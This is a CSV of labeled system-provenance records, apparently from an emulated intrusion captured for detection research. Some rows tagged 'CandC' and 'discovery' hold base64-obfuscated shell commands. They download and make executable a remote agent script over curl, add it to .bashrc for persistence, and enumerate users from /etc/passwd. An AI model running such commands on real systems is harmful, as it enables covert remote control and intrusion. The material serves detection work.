id,type,from,to,uid,egid,exe,gid,euid,name,pid,seen time,source,ppid,command line,start time,event id,time,operation,path,subtype,permissions,epoch,version,flags,local address,remote port,protocol,remote address,local port,tgid,fd,mode,label,subLabel,window
,WasGeneratedBy,e75e3a685d707b54eac60eaac2c5279a,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156398.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,a01fa649b6b1d735101cd761ea2104eb,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156400.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,0667aeb73c750f40cb5c86655af7317b,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156402.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,efe62eea2a04c4fc7b140f12e86441d3,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156404.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,ec7953aec97633bfbc4d89ea9ab23e10,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156406.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,ba32a1b1b02e24826fd0f9db7d0d03cc,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156408.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,049bbd4dcc15f0bde75471ba13ba37ac,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156410.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156413.0,1701560843.671,unlink,,,,,,,,,,,,,,,0,0,28359347
30d5a9642fb10ae48d46d91539ae71b4,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,92385.0,1701560845.695,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,CandC,28359347
642c1833761abb40f0d49fddb9bd6cd2,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,92385.0,,syscall,4127.0,"sh -c eval ""$(echo Y3VybCAtc08gaHR0cDovLzE3Mi4xNi42NS4xMjg6ODAwMC9zYW5kY2F0LmJhc2g7Y2htb2QgK3ggc2FuZGNhdC5iYXNo | base64 --decode)""",1701560845.695,,,,,,,,,,,,,,,,,,1,CandC,28359347
,WasTriggeredBy,642c1833761abb40f0d49fddb9bd6cd2,30d5a9642fb10ae48d46d91539ae71b4,,,,,,,,,syscall,,,,156434.0,1701560845.695,execve,,,,,,,,,,,,,,,0,0,28359347
,Used,642c1833761abb40f0d49fddb9bd6cd2,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,156434.0,1701560845.695,load,,,,,,,,,,,,,,,0,0,28359347
,Used,642c1833761abb40f0d49fddb9bd6cd2,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,156434.0,1701560845.695,load,,,,,,,,,,,,,,,0,0,28359347
2bca7ce7d7dbabe3e6ad063e16c69166,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,92388.0,1701560845.699,syscall,92386.0,,,,,,,,,,,,,,,,,,,,0,0,28359347
75b5c127229aab552a09044b10c97483,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,92388.0,,syscall,92386.0,base64 --decode,1701560845.699,,,,,,,,,,,,,,,,,,0,0,28359347
,WasTriggeredBy,75b5c127229aab552a09044b10c97483,2bca7ce7d7dbabe3e6ad063e16c69166,,,,,,,,,syscall,,,,156435.0,1701560845.699,execve,,,,,,,,,,,,,,,0,0,28359347
,Used,75b5c127229aab552a09044b10c97483,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,156435.0,1701560845.699,load,,,,,,,,,,,,,,,0,0,28359347
,Used,75b5c127229aab552a09044b10c97483,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,156435.0,1701560845.699,load,,,,,,,,,,,,,,,0,0,28359347
d0a84b59d15413e4d1a32ab3f4071f47,Process,,,1000.0,1000.0,/usr/bin/curl,1000.0,1000.0,curl,92389.0,1701560845.703,syscall,92385.0,,,,,,,,,,,,,,,,,,,,1,CandC,28359347
1d612dcfc45ee5e762b69935ef3a30cf,Process,,,1000.0,1000.0,/usr/bin/curl,1000.0,1000.0,curl,92389.0,,syscall,92385.0,curl -sO http://172.16.65.128:8000/sandcat.bash,1701560845.703,,,,,,,,,,,,,,,,,,1,CandC,28359347
,WasTriggeredBy,1d612dcfc45ee5e762b69935ef3a30cf,d0a84b59d15413e4d1a32ab3f4071f47,,,,,,,,,syscall,,,,156436.0,1701560845.703,execve,,,,,,,,,,,,,,,0,0,28359347
,Used,1d612dcfc45ee5e762b69935ef3a30cf,c1afc225f35b0d2bae0fded23b588232,,,,,,,,,syscall,,,,156436.0,1701560845.703,load,,,,,,,,,,,,,,,0,0,28359347
,Used,1d612dcfc45ee5e762b69935ef3a30cf,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,156436.0,1701560845.703,load,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,75a090a9b8e649fe14ab5ca5ab765ac2,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156440.0,1701560846.907,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156442.0,1701560849.935,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156444.0,1701560853.76,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156446.0,1701560857.58,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156448.0,1701560861.388,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156450.0,1701560865.216,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156452.0,1701560869.044,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156454.0,1701560872.872,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156475.0,1701560878.84,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160187.0,1701563702.741,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160189.0,1701563706.557,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160192.0,1701563710.381,unlink,,,,,,,,,,,,,,,0,0,28359395
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,72a55a170468ec14a7ab40acb4bdeefd,,,,,,,,,syscall,,,,160193.0,1701563712.109,rename (read),,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,7de8ca17b123cc393a554c161a098f1a,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,160193.0,1701563712.109,rename (write),,,,,,,,,,,,,,,0,0,28359395
,WasDerivedFrom,7de8ca17b123cc393a554c161a098f1a,72a55a170468ec14a7ab40acb4bdeefd,,,,,,,1950.0,,syscall,,,,160193.0,1701563712.109,rename,,,,,,,,,,,,,,,0,0,28359395
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,40824155bef903377160d8fc4dfe022f,,,,,,,,,syscall,,,,160194.0,1701563712.109,rename (read),,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,33fa4cbec9fbef8a95fb94977defdf01,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,160194.0,1701563712.109,rename (write),,,,,,,,,,,,,,,0,0,28359395
,WasDerivedFrom,33fa4cbec9fbef8a95fb94977defdf01,40824155bef903377160d8fc4dfe022f,,,,,,,1950.0,,syscall,,,,160194.0,1701563712.109,rename,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,2dfc6bbe92fe300894affdc738e5e468,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,160195.0,1701563712.109,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160197.0,1701563715.945,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160199.0,1701563719.765,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160201.0,1701563723.594,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160222.0,1701563728.222,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160224.0,1701563732.046,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160226.0,1701563735.878,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160228.0,1701563739.706,unlink,,,,,,,,,,,,,,,0,0,28359395
9617ddfd032aa854244d4c9fdc813ce2,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,94961.0,1701563741.834,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,CandC,28359395
118b58c8ab372ad89f964aa7533381eb,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,94961.0,,syscall,4127.0,"sh -c eval ""$(echo ZWNobyB+L3NhbmRjYXQuYmFzaCA+PiB+Ly5iYXNocmM= | base64 --decode)""",1701563741.834,,,,,,,,,,,,,,,,,,1,CandC,28359395
,WasTriggeredBy,118b58c8ab372ad89f964aa7533381eb,9617ddfd032aa854244d4c9fdc813ce2,,,,,,,,,syscall,,,,160230.0,1701563741.834,execve,,,,,,,,,,,,,,,0,0,28359395
,Used,118b58c8ab372ad89f964aa7533381eb,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,160230.0,1701563741.834,load,,,,,,,,,,,,,,,0,0,28359395
,Used,118b58c8ab372ad89f964aa7533381eb,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,160230.0,1701563741.834,load,,,,,,,,,,,,,,,0,0,28359395
a61a3d9352e8a3a7d7dbef497f77a965,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,94964.0,1701563741.838,syscall,94962.0,,,,,,,,,,,,,,,,,,,,0,0,28359395
ff7cb08aa3a2f15b793587f6afac4ee6,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,94964.0,,syscall,94962.0,base64 --decode,1701563741.838,,,,,,,,,,,,,,,,,,0,0,28359395
,WasTriggeredBy,ff7cb08aa3a2f15b793587f6afac4ee6,a61a3d9352e8a3a7d7dbef497f77a965,,,,,,,,,syscall,,,,160231.0,1701563741.838,execve,,,,,,,,,,,,,,,0,0,28359395
,Used,ff7cb08aa3a2f15b793587f6afac4ee6,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,160231.0,1701563741.838,load,,,,,,,,,,,,,,,0,0,28359395
,Used,ff7cb08aa3a2f15b793587f6afac4ee6,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,160231.0,1701563741.838,load,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160233.0,1701563745.634,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160235.0,1701563749.454,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160237.0,1701563753.282,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160258.0,1701563758.914,unlink,,,,,,,,,,,,,,,0,0,28359395
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165050.0,1701567363.647,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165052.0,1701567367.475,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165054.0,1701567371.295,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165056.0,1701567375.127,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165058.0,1701567378.943,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165060.0,1701567382.771,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165081.0,1701567389.016,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165083.0,1701567392.832,unlink,,,,,,,,,,,,,,,0,0,28359456
d673ae9d2afc2d9ca187ca67c1ec08eb,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,98270.0,1701567393.892,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359456
e2fe987d9bc778049349cdf79d7fa2be,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,98270.0,,syscall,4127.0,"sh -c eval ""$(echo Y3V0IC1kOiAtZjEgL2V0Yy9wYXNzd2QgfCBncmVwIC12ICdfJyB8IGdyZXAgLXYgJyMn | base64 --decode)""",1701567393.892,,,,,,,,,,,,,,,,,,1,discovery,28359456
,WasTriggeredBy,e2fe987d9bc778049349cdf79d7fa2be,d673ae9d2afc2d9ca187ca67c1ec08eb,,,,,,,,,syscall,,,,165085.0,1701567393.892,execve,,,,,,,,,,,,,,,0,0,28359456
,Used,e2fe987d9bc778049349cdf79d7fa2be,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,165085.0,1701567393.892,load,,,,,,,,,,,,,,,0,0,28359456
,Used,e2fe987d9bc778049349cdf79d7fa2be,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,165085.0,1701567393.892,load,,,,,,,,,,,,,,,0,0,28359456
ab84f19403df983db5083966ecda72a2,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,98273.0,1701567393.896,syscall,98271.0,,,,,,,,,,,,,,,,,,,,0,0,28359456
51e6f932724ab1c5d49a70a691b1b52c,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,98273.0,,syscall,98271.0,base64 --decode,1701567393.896,,,,,,,,,,,,,,,,,,0,0,28359456
,WasTriggeredBy,51e6f932724ab1c5d49a70a691b1b52c,ab84f19403df983db5083966ecda72a2,,,,,,,,,syscall,,,,165086.0,1701567393.896,execve,,,,,,,,,,,,,,,0,0,28359456
,Used,51e6f932724ab1c5d49a70a691b1b52c,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,165086.0,1701567393.896,load,,,,,,,,,,,,,,,0,0,28359456
,Used,51e6f932724ab1c5d49a70a691b1b52c,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,165086.0,1701567393.896,load,,,,,,,,,,,,,,,0,0,28359456
88082b436a5072338b6adae779e5a603,Process,,,1000.0,1000.0,/usr/bin/grep,1000.0,1000.0,grep,98275.0,1701567393.9,syscall,98270.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359456
74e3fede0fc90b5d089b4e4c1a6c49c3,Process,,,1000.0,1000.0,/usr/bin/grep,1000.0,1000.0,grep,98275.0,,syscall,98270.0,grep -v _,1701567393.9,,,,,,,,,,,,,,,,,,1,discovery,28359456
,WasTriggeredBy,74e3fede0fc90b5d089b4e4c1a6c49c3,88082b436a5072338b6adae779e5a603,,,,,,,,,syscall,,,,165087.0,1701567393.9,execve,,,,,,,,,,,,,,,0,0,28359456
,Used,74e3fede0fc90b5d089b4e4c1a6c49c3,63f3a986babf340d1d98ac82e4614aaa,,,,,,,,,syscall,,,,165087.0,1701567393.9,load,,,,,,,,,,,,,,,0,0,28359456
,Used,74e3fede0fc90b5d089b4e4c1a6c49c3,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,165087.0,1701567393.9,load,,,,,,,,,,,,,,,0,0,28359456
13b8dae2a6330a48c029a4daeabe00c6,Process,,,1000.0,1000.0,/usr/bin/grep,1000.0,1000.0,grep,98276.0,1701567393.9,syscall,98270.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359456
8d39073a0b0b8f51514c6e677116ce15,Process,,,1000.0,1000.0,/usr/bin/grep,1000.0,1000.0,grep,98276.0,,syscall,98270.0,grep -v #,1701567393.9,,,,,,,,,,,,,,,,,,1,discovery,28359456
,WasTriggeredBy,8d39073a0b0b8f51514c6e677116ce15,13b8dae2a6330a48c029a4daeabe00c6,,,,,,,,,syscall,,,,165088.0,1701567393.9,execve,,,,,,,,,,,,,,,0,0,28359456
,Used,8d39073a0b0b8f51514c6e677116ce15,63f3a986babf340d1d98ac82e4614aaa,,,,,,,,,syscall,,,,165088.0,1701567393.9,load,,,,,,,,,,,,,,,0,0,28359456
,Used,8d39073a0b0b8f51514c6e677116ce15,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,165088.0,1701567393.9,load,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165091.0,1701567397.452,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165093.0,1701567401.092,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165095.0,1701567404.924,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165097.0,1701567408.752,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165099.0,1701567412.576,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165120.0,1701567419.013,unlink,,,,,,,,,,,,,,,0,0,28359456
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,037831ca354ed2166773992583894b24,,,,,,,,,syscall,,,,165121.0,1701567419.105,rename (read),,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,d864858d3ccdc7d97b63a2577700ec02,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,165121.0,1701567419.105,rename (write),,,,,,,,,,,,,,,0,0,28359456
,WasDerivedFrom,d864858d3ccdc7d97b63a2577700ec02,037831ca354ed2166773992583894b24,,,,,,,1950.0,,syscall,,,,165121.0,1701567419.105,rename,,,,,,,,,,,,,,,0,0,28359456
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,ade65d74d0facb9491a8f57f30980175,,,,,,,,,syscall,,,,165122.0,1701567419.105,rename (read),,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,5c384c7b04b8581f19a705e3da3d2cb6,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,165122.0,1701567419.105,rename (write),,,,,,,,,,,,,,,0,0,28359456
,WasDerivedFrom,5c384c7b04b8581f19a705e3da3d2cb6,ade65d74d0facb9491a8f57f30980175,,,,,,,1950.0,,syscall,,,,165122.0,1701567419.105,rename,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,628182e1fc0417c9adfd5488908df1ac,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,165123.0,1701567419.109,unlink,,,,,,,,,,,,,,,0,0,28359456
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169845.0,1701570962.931,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169847.0,1701570966.754,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169849.0,1701570970.581,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169851.0,1701570974.413,unlink,,,,,,,,,,,,,,,0,0,28359516
